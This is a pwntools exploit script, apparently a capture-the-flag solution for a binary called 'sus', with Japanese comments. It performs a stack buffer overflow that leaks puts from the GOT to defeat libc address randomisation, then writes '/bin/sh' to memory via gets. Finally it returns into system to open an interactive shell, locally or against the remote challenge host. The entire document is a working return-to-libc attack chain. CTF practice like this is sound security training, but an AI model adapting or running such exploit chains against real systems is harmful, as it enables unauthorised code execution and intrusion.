from pwn import *

exe = ELF("./sus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *main+81
        continue
    """)
elif args.REMOTE:
    io = remote("chall.lac.tf", "31284")

offset = 0x40 - 0x8

# *********************************************
# leak libc address
# *********************************************
payload = b''
payload += b'A' * offset
payload += pack(exe.got.puts) # rdi
payload += b'A' * 8 # saved_rbp
payload += pack(exe.symbols.puts) # return_addr
payload += pack(exe.symbols.main) # return_addr
io.sendlineafter(b'?', payload)
io.recvline()
puts_addr = int.from_bytes(io.recv(6), 'little')
libc.address = puts_addr - libc.symbols.puts
print(f'{hex(libc.address) = }')

# *********************************************
# '/bin/sh' 書き込み
# *********************************************
# libc.search(b'/bin/sh') の位置がサーバーと違うので
writable_addr = 0x404030
payload = b''
payload += b'A' * offset
payload += pack(writable_addr) # rdi
payload += b'A' * 8 # saved_rbp
payload += pack(exe.symbols.gets) # return_addr
payload += pack(exe.symbols.main) # return_addr
io.sendlineafter(b'?', payload)
io.sendline(b'/bin/sh\x00')

# *********************************************
# system('/bin/sh')
# *********************************************
ret_addr = 0x0000000000401016
payload = b''
payload += b'A' * offset
payload += pack(writable_addr) # rdi
payload += b'A' * 8 # saved_rbp
payload += pack(ret_addr) # return_addr
payload += pack(libc.symbols.system) # return_addr
io.sendlineafter(b'?', payload)
io.interactive()
